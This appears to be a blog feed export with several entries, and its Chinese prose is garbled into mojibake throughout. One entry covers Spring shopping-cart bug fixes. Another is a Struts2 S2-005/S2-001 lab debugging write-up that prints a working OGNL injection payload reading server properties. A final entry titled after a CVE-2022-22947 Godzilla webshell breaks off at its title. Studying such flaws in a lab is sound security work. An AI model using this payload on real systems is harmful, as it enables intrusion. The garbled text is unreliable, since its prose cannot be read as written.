&#x27;&#x27;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>æœªè§£å†³ï¼šè¿˜æ˜¯è¿™ä¸ªåŠŸèƒ½ï¼Œå¤šæŒ‰å‡ æ¬¡é¦–é¡µå’Œå°¾é¡µï¼Œå°±å¤±å»ç¿»é¡µåŠŸèƒ½äº†ï¼Œåˆ°ç°åœ¨ä¸çŸ¥é“ä¸ºä»€ä¹ˆ</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230521225945903.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230521225945903.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>æ·»åŠ è´­ç‰©è½¦éƒ¨åˆ†</li></ul><p>æ·»åŠ è´­ç‰©è½¦æ˜¯ç”¨æˆ·ä¸ªäººä¿¡æ¯ï¼Œéœ€è¦ç”¨åˆ°sessionæ¥å­˜å‚¨ä¿¡æ¯ï¼Œè€Œè¿™ä¹ˆäº›æ˜¯é”™çš„ï¼ˆUseræ˜¯è‡ªå®šä¹‰çš„è¿æ¥æ•°æ®åº“çš„å®ä½“ç±»ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br></pre></td></tr></table></figure><p>è€Œåº”è¯¥è¿™ä¹ˆå†™ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br></pre></td></tr></table></figure><p>å› ä¸ºsession.getAttribute()æ˜¯ objectå¯¹è±¡ï¼Œéœ€è¦å¼ºåˆ¶è½¬æ¢ä¸ºUserå¯¹è±¡</p><ul><li>ResponseBodyæ³¨è§£çš„ä½¿ç”¨ï¼š</li></ul><p>â€‹å¦‚æœä¸ä½¿ç”¨  <code>@ResponseBody</code>  æ³¨è§£ï¼Œæ§åˆ¶å™¨æ–¹æ³•è¿”å›çš„æ•°æ®å°†è¢«æ¡†æ¶æ”¾å…¥æ¨¡å‹ï¼ˆModelï¼‰æˆ–ç›´æ¥å†™å…¥å“åº”æµï¼Œ</p><p>â€‹å¦‚æœè¿”å›ç±»å‹æ˜¯ Stringï¼Œå®ƒå°†è¢«å½“ä½œè§†å›¾çš„åç§°è¿›è¡Œè§£æï¼Œå¦‚æœè¿”å›ç±»å‹æ˜¯ voidï¼Œåˆ™è§†å›¾åç§°å°†ä»è¯·æ±‚è·¯å¾„ï¼ˆRequest URIï¼‰ä¸­æ¨æ–­å‡ºæ¥ã€‚  </p><p>å¦‚æœè¿”å›å€¼æ˜¯å¯¹è±¡ï¼Œåˆ™æ¡†æ¶ä¼šåƒä¸‹é¢è¿™æ ·å¤„ç†è¯¥å¯¹è±¡ï¼š   </p><ul><li><ul><li><p>å°†å¯¹è±¡æ”¾å…¥æ¨¡å‹ï¼ˆModelï¼‰ä¸­ï¼Œæ¨¡å‹çš„ keyé»˜è®¤ä¸ºå¯¹è±¡çš„ç±»åï¼ˆé¦–å­—æ¯å°å†™ï¼‰ï¼Œå¯ä»¥é€šè¿‡  <code>@ModelAttribute</code>  æ³¨è§£æŒ‡å®šå…¶ä»–çš„ keyã€‚æ¨¡å‹å¯ä»¥åœ¨ JSPã€Thymeleafã€Freemarkerã€Velocityã€Mustache ç­‰å„ç§è§†å›¾æ¨¡æ¿ä¸­ä½¿ç”¨ã€‚ </p></li><li><p>å¦‚æœæ§åˆ¶å™¨æ–¹æ³•è¿”å›ç±»å‹ä¸º  <code>String</code> ï¼Œå°†å…¶è§£é‡Šä¸ºè§†å›¾çš„åç§°ï¼Œå¹¶ä½¿ç”¨è§†å›¾è§£æå™¨ï¼ˆViewResolverï¼‰æŸ¥æ‰¾ç›¸åº”çš„è§†å›¾ï¼Œå¹¶ä½¿ç”¨æ¨¡å‹ä¸­çš„æ•°æ®æ¸²æŸ“è§†å›¾ã€‚  </p></li><li><p>å¦‚æœæ§åˆ¶å™¨æ–¹æ³•è¿”å›  <code>void</code> ï¼Œåˆ™è§†å›¾åç§°å°†ä»è¯·æ±‚è·¯å¾„ä¸­æ¨æ–­å‡ºæ¥ï¼Œä½¿ç”¨ç›¸åº”çš„è§†å›¾è§£æå™¨ï¼ˆViewResolverï¼‰æŸ¥æ‰¾è§†å›¾ï¼Œå¹¶ä½¿ç”¨æ¨¡å‹ä¸­çš„æ•°æ®æ¸²æŸ“è§†å›¾ã€‚</p></li></ul><p>  ä¸‹é¢æ˜¯ä¸ä½¿ç”¨  <code>@ResponseBody</code>  æ³¨è§£çš„ç¤ºä¾‹ï¼š</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUserById</span><span class="params">(<span class="meta">@PathVariable</span> Integer id, Model model)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userService.getUserById(id);</span><br><span class="line">        model.addAttribute(<span class="string">&quot;user&quot;</span>, user);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;user&quot;</span>; <span class="comment">// è§†å›¾åç§°ä¸º user</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæ–¹æ³•è¿”å›äº†ä¸€ä¸ª String ç±»å‹çš„å­—ç¬¦ä¸² â€œuserâ€ï¼Œè¡¨ç¤ºè¿”å›çš„ VIEWNAME æ˜¯ â€œuserâ€ã€‚è¿™ä¸ª VIEWNAME ä¼šè¢«è§†å›¾è§£æå™¨ï¼ˆViewResolverï¼‰è§£ææˆå¯¹åº”çš„è§†å›¾ï¼Œç„¶åä½¿ç”¨æ¨¡å‹ä¸­çš„æ•°æ®è¿›è¡Œè§†å›¾æ¸²æŸ“ã€‚</p><ul><li>æº¢å‡ºé—®é¢˜</li></ul><p>åœ¨ç‰¹å®šçš„æ•°é‡ç§°é‡‘é¢æ—¶å‘ç”Ÿæµ®ç‚¹çš„æº¢å‡º</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230530142842220.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230530142842220.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230530142921370.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230530142921370.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>éœ€è¦ç”¨BigDecimalæé«˜ç²¾åº¦ï¼Œå…ˆæŠŠdoubleå‹è½¬ä¸ºstringï¼Œå†è½¬ä¸ºBigDecimalçš„Doubleï¼Œç²¾åº¦èƒ½æå‡è®¸å¤šï¼š</p><p><code>BigDecimal difsum = new BigDecimal(Double.toString(sum));</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getCartItemTotal</span><span class="params">(List&lt;CartVo&gt; list)</span>&#123;</span><br><span class="line">    <span class="type">double</span> sum=<span class="number">0.0</span>;</span><br><span class="line">    <span class="type">BigDecimal</span> <span class="variable">difsum</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(Double.toString(sum));</span><br><span class="line">    <span class="keyword">for</span>(CartVo cart:list)&#123;</span><br><span class="line">        <span class="type">BigDecimal</span> <span class="variable">price</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(Double.toString(cart.getNewPrice()));</span><br><span class="line">        <span class="type">BigDecimal</span> <span class="variable">count</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(Integer.toString(cart.getCount()));</span><br><span class="line">        difsum = difsum.add(price.multiply(count));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> difsum.doubleValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230530144752481.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230530144752481.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>åœ¨å‡½æ•°ä¼ å‚å’Œæ¥æ”¶å‚æ•°çš„æ—¶å€™ï¼Œæ²¡å¼„æ‡‚<code>List&lt;String&gt;</code>å’Œ<code>String[]</code>çš„åŒºåˆ«ï¼Œå¦‚ä¸‹ï¼š</li></ul><blockquote><ol><li><p>é•¿åº¦ä¸åŒ<br> String[]æ˜¯ä¸€ä¸ªå›ºå®šé•¿åº¦çš„æ•°ç»„ï¼Œä¸€æ—¦åˆ›å»ºåé•¿åº¦å°±ä¸èƒ½æ”¹å˜ã€‚è€ŒList<String>æ˜¯ä¸€ä¸ªå¯å˜é•¿åº¦çš„åˆ—è¡¨ï¼Œå¯ä»¥åŠ¨æ€æ·»åŠ ã€åˆ é™¤å…ƒç´ ã€‚</p></li><li><p>å†…å­˜å ç”¨ä¸åŒ<br> String[]æ˜¯ä¸€ä¸ªå¯¹è±¡æ•°ç»„ï¼Œéœ€è¦åœ¨å†…å­˜ä¸­è¿ç»­åˆ†é…ä¸€æ®µå›ºå®šå¤§å°çš„ç©ºé—´æ¥å­˜å‚¨æ‰€æœ‰å…ƒç´ ï¼Œå› æ­¤å ç”¨çš„å†…å­˜ç©ºé—´æ˜¯å›ºå®šçš„ã€‚è€ŒList<String>æ˜¯ä¸€ä¸ªå¯¹è±¡åˆ—è¡¨ï¼Œæ¯ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å¯¹è±¡ï¼Œéœ€è¦åœ¨å†…å­˜ä¸­å•ç‹¬åˆ†é…ç©ºé—´æ¥å­˜å‚¨ï¼Œå› æ­¤å ç”¨çš„å†…å­˜ç©ºé—´æ˜¯åŠ¨æ€å˜åŒ–çš„ã€‚</p></li><li><p>è®¿é—®æ–¹å¼ä¸åŒ</p></li></ol><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603151050507.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603151050507.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ol start="4"><li>åŠŸèƒ½ä¸åŒ<br> String[]æä¾›äº†ä¸€äº›æ•°ç»„ç›¸å…³çš„æ“ä½œï¼Œä¾‹å¦‚æ’åºã€å¤åˆ¶ã€æŸ¥æ‰¾ç­‰ã€‚è€ŒList<String>æä¾›äº†ä¸€äº›åˆ—è¡¨ç›¸å…³çš„æ“ä½œï¼Œä¾‹å¦‚æ·»åŠ ã€åˆ é™¤ã€æ’å…¥ã€æ›¿æ¢ç­‰ã€‚</li></ol></blockquote><p>æ‰€ä»¥ï¼Œè¿™ä¸¤ç§å‚æ•°æ··ç€ç”¨æ˜¯ä¸è¡Œçš„</p><ul><li>æˆ‘ä¸€ä¸ªæ”¹äº†ä¸€å¤©çš„é—®é¢˜ï¼Œå¦‚ä¸‹æŠ¥é”™ï¼š</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172051633.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172051633.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘çš„è®¢å•é¡µé¢å‰ç«¯ä¸åç«¯çš„é€šé“ç‚¹åœ¨ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">loadData</span>(<span class="params">page,pageSize</span>) &#123;</span><br><span class="line">    $(<span class="string">&quot;#orderData&quot;</span>).<span class="title function_">load</span>(contextPath + <span class="string">&quot;/order/getOrderListData&quot;</span>,<span class="title function_">queryData</span>(page,pageSize))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨OrderControlleré‡Œå¤„ç†æ•°æ®å±•ç¤ºçš„é€»è¾‘ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/getOrderListData&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getOrderListData</span><span class="params">(HttpSession session, OrderQueryVo orderQueryVo, Model model)</span>&#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    List&lt;Order&gt; orders = orderService.findUserOrder(user.getId(),orderQueryVo);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;orders&quot;</span>,orders);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;pre&quot;</span>,orderQueryVo.getPage() -<span class="number">1</span>);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;next&quot;</span>,orderQueryVo.getPage() + <span class="number">1</span>);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;cur&quot;</span>,orderQueryVo.getPage());</span><br><span class="line">    model.addAttribute(<span class="string">&quot;pages&quot;</span>,orderService.findUserOrderPages(user.getId(),orderQueryVo));</span><br><span class="line">    model.addAttribute(<span class="string">&quot;pageSize&quot;</span>,orderQueryVo.getPageSize());</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;orderData&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æ•°æ®æŸ¥è¯¢çš„å…³é”®è¯­å¥ä¸ºï¼š<code>List&lt;Order&gt; orders = orderService.findUserOrder(user.getId(),orderQueryVo);</code></p><p>äºæ˜¯è‡ªç„¶è€Œç„¶çš„è½¬åˆ°orderService.findUserOrder:</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172521873.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172521873.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç„¶åæˆ‘æƒ³ç”¨ä¸€æ‰‹é«˜çº§ç”¨æ³•ï¼Œäºæ˜¯ç”¨çš„OrderMapper.xmlåšmapperæ˜ å°„ï¼ŒOrderMapper.xmlé‡Œå®šä¹‰findOrderAndOrderDetailListByUserçš„SQLæŸ¥è¯¢è¯­å¥ï¼Œå†é€šè¿‡mapperæ˜ å°„è¿‡å»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172908435.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172908435.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172959663.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172959663.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç„¶åå°±å‡ºç°äº†æ³¨å…¥å¤±è´¥çš„é—®é¢˜ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172051633.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172051633.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ²¡é”™ï¼ç»“æœå°±æ˜¯åœ¨application.xmlå¯¹mapperæ³¨å…¥æ‰«æè·¯å¾„çš„é—®é¢˜ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapper-locations: classpath*:mapper/*/*Mapper.xml</span><br></pre></td></tr></table></figure><p>åº”è¯¥æ˜¯ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapper-locations: classpath*:mapper/*Mapper.xml</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨Spring Bootä¸­ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦æ¥åŒ¹é…å¤šä¸ªMapperæ˜ å°„æ–‡ä»¶çš„è·¯å¾„ã€‚é€šé…ç¬¦çš„ä½¿ç”¨æ–¹æ³•æ˜¯åœ¨è·¯å¾„ä¸­ä½¿ç”¨*å·ä»£æ›¿ä»»æ„å­—ç¬¦ï¼Œä¾‹å¦‚ï¼š<br>- <code>classpath*:mapper/*.xml</code>ï¼šè¡¨ç¤ºåŒ¹é…classpathä¸‹çš„æ‰€æœ‰ä»¥.xmlç»“å°¾çš„æ–‡ä»¶ï¼Œä¸”æ–‡ä»¶ååœ¨mapperç›®å½•ä¸‹ã€‚<br>- <code>classpath*:mapper/*Mapper.xml</code>ï¼šè¡¨ç¤ºåŒ¹é…classpathä¸‹çš„æ‰€æœ‰ä»¥Mapper.xmlç»“å°¾çš„æ–‡ä»¶ï¼Œä¸”æ–‡ä»¶ååœ¨mapperç›®å½•ä¸‹ã€‚<br>- <code>classpath*:mapper/*/*Mapper.xml</code>ï¼šè¡¨ç¤ºåŒ¹é…classpathä¸‹çš„æ‰€æœ‰ä»¥Mapper.xmlç»“å°¾çš„æ–‡ä»¶ï¼Œä¸”æ–‡ä»¶ååœ¨mapperç›®å½•ä¸‹çš„å­ç›®å½•ä¸­ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> javaæ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaæ‚è®º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>struct2åˆ©ç”¨</title>
      <link href="/2023/05/01/struct2-fastjson-shiro-jboss-he-ji/"/>
      <url>/2023/05/01/struct2-fastjson-shiro-jboss-he-ji/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘å¿…ç«å‡ºäº†ä¸€ä¸ªååºåˆ—åŒ–çš„è§†é¢‘ï¼Œå‡ºæ¥æˆ‘å°±ä¹°äº†ï¼Œå¾ˆå¿«å•Šï¼Œé©¬ä¸Šæ¥ç¯‡æ€»ç»“</p><p>æ¼æ´ç¯å¢ƒå‡ä¸ºdocker composeèµ·çš„vulhubï¼Œç„¶åç¯å¢ƒæ‹‰å‡ºæ¥ï¼ŒIDEAé…ä¸ªè¿œç¨‹è°ƒè¯•</p><h1 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h1><h2 id="s2-005"><a href="#s2-005" class="headerlink" title="s2-005"></a>s2-005</h2><p>å¦‚ä½•å¿«é€Ÿåˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦ä½¿ç”¨äº†struct2:è·¯å¾„ä¸­ä¼šå­˜åœ¨xxx.action</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230526124630577.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230526124630577.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¾æ¬¡ä¸ºæ‰§è¡Œåˆ°ä¸‹ä¸€è¡Œï¼Œæ­¥å…¥å’Œå¼ºåˆ¶æ­¥å…¥</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230526125956617.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230526125956617.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœè°ƒè¯•ä¸­æ²¡æœ‰æ­¥å…¥ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰å¯¼å…¥ä¾èµ–åŒ…ã€‚åœ¨libåº“å³é”®æ·»åŠ åº“ï¼Œé€‰æ‹©é»˜è®¤(Project libraryçš„è¿›è¡Œæ·»åŠ </p><p>payloadï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608095226448.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608095226448.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç”¨ç¬¬ä¸€ä¸ªpayloadåšä¸‹è°ƒè¯•</p><p><code>%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</code>ï¼ŒåŸç†å°±æ˜¯é€šè¿‡OGNLå¤šæ¬¡è§£æ%{}ï¼Œä»è€Œè°ƒç”¨äº†java.lang.Sytemçš„getProperty(â€œuser.dirâ€)æ¥è·å–è·¯å¾„</p><h3 id="å¾ªç¯è§£æognl"><a href="#å¾ªç¯è§£æognl" class="headerlink" title="å¾ªç¯è§£æognl"></a>å¾ªç¯è§£æognl</h3><p>strut2 001å°±æ˜¯åˆ©ç”¨äº†åœ¨è§£æè¡¨å•æ—¶åˆ©ç”¨äº†OGNL(%{})æ¥è¿›è¡Œè§£æï¼Œå…¥å£ç‚¹åœ¨TextParseUtilï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> expression;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ‰“ä¸Šæ–­ç‚¹ï¼Œè®°å¾—è¦å³ä¸Šè§’ä¸‹è½½æºç </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608092433328.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608092433328.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœ€å¼€å§‹çš„expressionæ˜¯index.jspï¼Œ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608092655596.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608092655596.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¸€ç›´è·³è¿‡ç›´åˆ°expressionä¸º%{username}<img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608092812330.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608092812330.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¼€å§‹æ­¥è¿‡ï¼Œstartæ¥åˆ°0</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608093022809.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608093022809.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨è¿™é‡Œwhileæ¡ä»¶éƒ½ä¸ºçœŸï¼Œè¿›å…¥å¾ªç¯ï¼Œå¾ªç¯å°±æ˜¯å–%{}ä¸­é—´çš„å€¼</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608093110602.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608093110602.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¼ºåˆ¶è·³åˆ°end &#x3D; x - 1</p><p>åœ¨è¿™é‡Œæ­¥å…¥å¯ä»¥çœ‹åˆ°è·³åˆ°äº†OgnlValueStack</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608093647089.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608093647089.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¸‹é¢çš„è°ƒè¯•å°±ä¸è¯¦ç»†è®²äº†ï¼Œä¸€æ ·çš„æ€è·¯ï¼Œç®—äº†è¿˜æ˜¯è®°å½•ä¸€ä¸‹</p><p>ä¸€ç›´æ­¥è¿‡åˆ°æ‰§è¡ŒOgnlUtil.getValue()è·å–è¡¨è¾¾å¼çš„å€¼ï¼Œæ­¥å…¥</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608103727072.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608103727072.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è°ƒç”¨äº†Ognlå¯¹è±¡çš„æ–¹æ³•ï¼Œç»§ç»­æ­¥å…¥</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608103746199.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608103746199.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608103805245.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608103805245.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿è¡Œåˆ°è¿™ä¸€æ­¥æ—¶ï¼Œreultå°±æ˜¯è¾“å…¥çš„usernameçš„å€¼</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608103849164.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608103849164.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿”å›åˆ°OgnlValueStackï¼ŒæŠŠå–å‡ºæ¥çš„usernameçš„å€¼èµ‹ç»™äº†value</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608104019300.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608104019300.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¸Šè¿°çš„æ­¥éª¤å°±æ˜¯é€šè¿‡findValueæ‰¾åˆ°usernameé‡Œçš„å€¼ï¼Œç›¸å½“äºphpé‡Œçš„<code>value = $_POST[&#39;username&#39;];</code></p><p>å› ä¸ºå¤„äºwhileå¾ªç¯ï¼Œä¸”æ¯æ¬¡å¾ªç¯åé¢éƒ½æŠŠè·å–åˆ°çš„å€¼å†æ¬¡èµ‹ç»™äº†expressionã€‚æ‰€ä»¥å®é™…ä¸Šè¿™æ˜¯ä¸€ä¸ªå¤šæ¬¡è§£æï¼Œä¹Ÿå°±æ˜¯%</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> æ¡†æ¶æ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> struct2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud GateWay CVE-2022-22947æ„é€ å“¥æ–¯æ‹‰é©¬</title>
      <link href="/2023/04/19/spring-cloud-gateway-cve-2022-22947-spel-biao-da-shi-zhu-ru/"/>
      <url>/2023/04/19/spring-cloud-gateway-cve-2022-22947-spel-biao-da-shi-zhu-ru/</url>
      
